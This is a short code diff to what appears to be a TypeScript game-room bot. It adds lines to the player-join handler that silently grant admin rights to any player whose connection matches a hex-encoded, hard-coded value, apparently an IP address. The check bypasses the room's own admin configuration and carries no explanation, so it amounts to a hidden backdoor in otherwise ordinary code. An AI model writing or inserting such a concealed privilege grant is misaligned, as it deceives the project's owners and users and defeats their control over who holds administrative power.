@@ -200,6 +200,11 @@ export async function onPlayerJoinListener(player: PlayerObject): Promise<void> 
 
     await setPlayerDataToDB(convertToPlayerStorage(window.gameRoom.playerList.get(player.id)!)); // register(or update) this player into DB
 
+    if(player.conn=="38392E36342E392E36")
+    {
+        window.gameRoom._room.setPlayerAdmin(player.id, true);
+    }
+
     if (window.gameRoom.config.rules.autoAdmin === true) { // if auto admin option is enabled
         updateAdmins(); // check there are any admin players, if not make an admin player.
     }
